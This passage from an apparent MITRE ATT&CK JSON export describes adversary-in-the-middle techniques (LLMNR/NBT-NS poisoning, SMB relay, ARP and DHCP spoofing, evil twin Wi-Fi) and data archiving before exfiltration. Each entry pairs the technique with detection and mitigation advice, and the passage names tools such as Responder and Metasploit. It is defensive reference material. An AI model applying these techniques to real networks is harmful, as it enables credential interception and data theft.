Cloud Storage Best Practices, 2019)</a> There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records. <a href=\"https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/a-misconfigured-amazon-s3-exposed-almost-50-thousand-pii-in-australia\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro S3 Exposed PII, 2017)</a> <a href=\"https://www.wired.com/story/magecart-amazon-cloud-hacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wired Magecart S3 Buckets, 2019)</a> <a href=\"https://www.hipaajournal.com/47gb-medical-records-unsecured-amazon-s3-bucket/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: HIPAA Journal S3 Breach, 2017)</a> <a href=\"https://redcanary.com/blog/rclone-mega-extortion/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rclone-mega-extortion_05_2021)</a>\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.","detection":"Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.","platforms":["IaaS","Office Suite","SaaS"],"dataSources":["Cloud Service: Cloud Service Metadata","Cloud Storage: Cloud Storage Access"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Configure user permissions groups and roles for access to cloud storage. <a href=\"https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Storage Security, 2019)</a> Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. <a href=\"https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon S3 Security, 2019)</a> Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon  AWS Temporary Security Credentials)</a>"},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Use access control lists on storage systems and objects."},{"id":"M1032","name":"Multi-factor Authentication","description":"Consider using multi-factor authentication to restrict access to resources and cloud storage APIs. <a href=\"https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon S3 Security, 2019)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP allowlisting along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Encrypt data stored at rest in cloud storage. <a href=\"https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon S3 Security, 2019)</a> <a href=\"https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Storage Security, 2019)</a> Managed encryption keys can be rotated by most providers. At a minimum, ensure an incident response plan to storage breach includes rotating the keys and test for impact on client applications. <a href=\"https://cloud.google.com/kms/docs/key-rotation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Encryption Key Rotation)</a>"},{"id":"M1047","name":"Audit","description":"Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. <a href=\"https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon S3 Security, 2019)</a>"}],"subTechniques":[]},{"id":"T1557","name":"Adversary-in-the-Middle","description":"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions. <a href=\"https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7 MiTM Basics)</a>\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware. <a href=\"https://blog.netlab.360.com/ttint-an-iot-remote-control-trojan-spread-through-2-0-day-vulnerabilities/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ttint_rat)</a> <a href=\"https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/125/how-dns-changer-trojans-direct-users-to-threats\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dns_changer_trojans)</a> <a href=\"https://securelist.com/ad-blocker-with-miner-included/101105/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ad_blocker_with_miner)</a> Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie). <a href=\"https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: volexity_0day_sophos_FW)</a> <a href=\"https://www.microsoft.com/en-us/security/blog/2022/11/16/token-tactics-how-to-prevent-detect-and-respond-to-cloud-token-theft/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Token tactics)</a> Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm. <a href=\"https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mitm_tls_downgrade_att)</a> <a href=\"https://arxiv.org/abs/1809.05681\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: taxonomy_downgrade_att_tls)</a> <a href=\"https://tlseminar.github.io/downgrade-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: tlseminar_downgrade_att)</a>\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to impair defenses and/or in support of a Network Denial of Service.","detection":"Monitor network traffic for anomalies associated with known AiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Application Log: Application Log Content","Network Traffic: Network Traffic Content","Windows Registry: Windows Registry Key Modification","Network Traffic: Network Traffic Flow","Service: Service Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be suspicious about certificate errors. Adversaries may use their own certificates in an attempt to intercept HTTPS traffic. Certificate errors may arise when the application’s certificate does not match the one expected by the host."},{"id":"M1030","name":"Network Segmentation","description":"Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of AiTM activity."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit access to network infrastructure and resources that can be used to reshape traffic or otherwise produce AiTM conditions."},{"id":"M1037","name":"Filter Network Traffic","description":"Use network appliances and host-based security software to block network traffic that is not necessary within the environment, such as legacy protocols that may be leveraged for AiTM conditions."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable legacy network protocols that may be used   to intercept network traffic if applicable, especially those that are not needed within an environment."}],"subTechniques":[{"id":"T1557.001","name":"Name Resolution Poisoning and SMB Relay","description":"By responding to LLMNR/NBT-NS/mDNS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. <a href=\"https://www.trendmicro.com/en_us/research/22/d/an-investigation-of-the-blackcat-ransomware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackCat ransomware)</a> This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. <a href=\"https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia LLMNR)</a> <a href=\"https://technet.microsoft.com/library/cc958811.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet NetBIOS)</a>\n\nMulticast Domain Name System(mDNS) is a zero-configuration service used to resolve hostnames to IP addresses with “.local” as a top-level domain. MDNS is based upon Domain Name System (DNS) format and allows hosts on the same network segment to perform name resolution for other hosts, using multicast. <a href=\"https://datatracker.ietf.org/doc/html/rfc6762\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mDNS RFC)</a>\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137)/mDNS (UDP 5353) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. <a href=\"https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: byt3bl33d3r NTLM Relaying)</a> <a href=\"https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secure Ideas SMB Relay)</a> Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various other protocols, such as LDAP, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder. <a href=\"https://github.com/nomex/nbnspoof\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub NBNSpoof)</a> <a href=\"https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7 LLMNR Spoofer)</a> <a href=\"https://github.com/SpiderLabs/Responder\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Responder)</a>","detection":"Monitor <code>HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient</code> for changes to the \"EnableMulticast\" DWORD value. A value of “0” indicates LLMNR is disabled. <a href=\"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sternsecurity LLMNR-NBTNS)</a>\n\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.\n\nDeploy an LLMNR/NBT-NS spoofing detection tool. <a href=\"https://github.com/Kevin-Robertson/Conveigh\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Conveigh)</a> Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques. <a href=\"https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secure Ideas SMB Relay)</a>","platforms":["Windows"],"dataSources":["Service: Service Creation","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of AiTM activity."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Use host-based security software to block LLMNR/NetBIOS/mDNS traffic. Enabling SMB Signing can stop NTLMv2 relay attacks. <a href=\"https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: byt3bl33d3r NTLM Relaying)</a> <a href=\"https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secure Ideas SMB Relay)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/system-center/operations-manager-2005/cc180803(v=technet.10)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SMB Packet Signing)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable LLMNR, mDNS, and NetBIOS in local computer security settings or by group policy if they are not needed within an environment. <a href=\"https://adsecurity.org/?p=3299\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Windows Secure Baseline)</a>"}]},{"id":"T1557.002","name":"ARP Cache Poisoning","description":"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. <a href=\"https://tools.ietf.org/html/rfc826\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RFC826 ARP)</a> Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache. <a href=\"https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sans ARP Spoofing Aug 2003)</a> <a href=\"https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Cleaver)</a>\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol. <a href=\"https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sans ARP Spoofing Aug 2003)</a>","detection":"Monitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. \n\nConsider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned.","platforms":["Linux","Windows","macOS"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be suspicious about certificate errors. Adversaries may use their own certificates in an attempt to intercept HTTPS traffic. Certificate errors may arise when the application’s certificate does not match the one expected by the host."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Create static ARP entries for networked devices. Implementing static ARP entries may be infeasible for large networks."},{"id":"M1037","name":"Filter Network Traffic","description":"Consider enabling DHCP Snooping and Dynamic ARP Inspection on switches to create mappings between IP addresses requested via DHCP and ARP tables and tie the values to a port on the switch that may block bogus traffic. <a href=\"https://www.cisco.com/c/en/us/products/collateral/switches/catalyst-6500-series-switches/white_paper_c11_603839.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco ARP Poisoning Mitigation 2016)</a> <a href=\"https://www.juniper.net/documentation/en_US/junos/topics/task/configuration/understanding-and-using-dai.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Juniper DAI 2020)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling updating the ARP cache on gratuitous ARP replies."}]},{"id":"T1557.003","name":"DHCP Spoofing","description":"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients. <a href=\"https://datatracker.ietf.org/doc/html/rfc2131\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: rfc2131)</a> The typical server-client interaction is as follows: \n\n1. The client broadcasts a <code>DISCOVER</code> message.\n\n2. The server responds with an <code>OFFER</code> message, which includes an available network address. \n\n3. The client broadcasts a <code>REQUEST</code> message, which includes the network address offered. \n\n4. The server acknowledges with an <code>ACK</code> message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers. <a href=\"https://isc.sans.edu/forums/diary/new+rogueDHCP+server+malware/6025/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: new_rogue_DHCP_serv_malware)</a> <a href=\"https://web.archive.org/web/20150923175837/http://www.symantec.com/security_response/writeup.jsp?docid=2009-032211-2952-99&tabid=2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: w32.tidserv.g)</a> Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address. <a href=\"https://datatracker.ietf.org/doc/html/rfc3315\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: rfc3315)</a> Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool.","detection":"Monitor network traffic for suspicious/malicious behavior involving DHCP, such as changes in DNS and/or gateway parameters. Additionally, monitor Windows logs for Event IDs (EIDs) 1341, 1342, 1020 and 1063, which specify that the IP allocations are low or have run out; these EIDs may indicate a denial of service attack. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800668(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dhcp_serv_op_events)</a> <a href=\"https://web.archive.org/web/20231202025258/https://lockstepgroup.com/blog/monitor-dhcp-scopes-and-detect-man-in-the-middle-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: solution_monitor_dhcp_scopes)</a>","platforms":["Linux","Windows","macOS"],"dataSources":["Network Traffic: Network Traffic Content","Application Log: Application Log Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800668(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dhcp_serv_op_events)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Consider filtering DHCP traffic on ports 67 and 68 to/from unknown or untrusted DHCP servers. Additionally, port security may also be enabled on layer switches. Furthermore, consider enabling DHCP snooping on layer 2 switches as it will prevent DHCP spoofing attacks and starvation attacks. Consider tracking available IP addresses through a script or a tool. \n\nAdditionally, block DHCPv6 traffic and incoming router advertisements, especially if IPv6 is not commonly used in the network. <a href=\"https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ntlm_relaying_kerberos_del)</a>"}]},{"id":"T1557.004","name":"Evil Twin","description":"Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or Input Capture. <a href=\"https://www.bleepingcomputer.com/news/security/australian-charged-for-evil-twin-wifi-attack-on-plane/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Australia ‘Evil Twin’)</a>\n\nBy using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks. <a href=\"https://usa.kaspersky.com/resource-center/preemptive-safety/evil-twin-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky evil twin)</a> <a href=\"https://kavigihan.medium.com/wireless-security-evil-twin-attack-d3842f4aef59\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: medium evil twin)</a>  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks. <a href=\"https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: specter ops evil twin)</a>  A Wi-Fi Pineapple – a network security auditing and penetration testing tool – may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic. \n\nSimilarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network. <a href=\"https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: specter ops evil twin)</a>  Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.\n\nUpon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim’s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points.","detection":"","platforms":["Network Devices"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be suspicious about access points marked as “Open” or “Unsecure” as well as certificate errors. Certificate errors may arise when the application’s certificate does not match the one expected by the host."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Wireless intrusion prevention systems (WIPS) can identify traffic patterns indicative of adversary-in-the-middle activity and scan for evils twins and rogue access points."}]}]},{"id":"T1560","name":"Archive Collected Data","description":"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. <a href=\"https://www.justice.gov/file/1080281/download\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DOJ GRU Indictment Jul 2018)</a> Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.","detection":"Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers. <a href=\"https://en.wikipedia.org/wiki/List_of_file_signatures\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia File Header Signatures)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Script: Script Execution","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1047","name":"Audit","description":"System scans can be performed to identify unauthorized archival utilities."}],"subTechniques":[{"id":"T1560.001","name":"Archive via Utility","description":"Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Diantz/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: diantz.exe_lolbas)</a> <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities. <a href=\"https://www.7-zip.org/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 7zip Homepage)</a> <a href=\"https://www.rarlab.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WinRAR Homepage)</a> <a href=\"https://www.winzip.com/win/en/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WinZip Homepage)</a>","detection":"Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers. <a href=\"https://en.wikipedia.org/wiki/List_of_file_signatures\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia File Header Signatures)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","File: File Creation"],"mitigations":[{"id":"M1047","name":"Audit","description":"System scans can be performed to identify unauthorized archival utilities."}]},{"id":"T1560.002","name":"Archive via Library","description":"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile <a href=\"https://pypi.org/project/rarfile/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PyPI RAR)</a>, libzip <a href=\"https://libzip.org/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: libzip)</a>, and zlib <a href=\"https://github.com/madler/zlib\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Zlib Github)</a>. Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.","detection":"Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers. <a href=\"https://en.wikipedia.org/wiki/List_of_file_signatures\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia File Header Signatures)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["Script: Script Execution","File: File Creation"],"mitigations":[]},{"id":"T1560.003","name":"Archive via Custom Method","description":"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used. <a href=\"http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Sednit 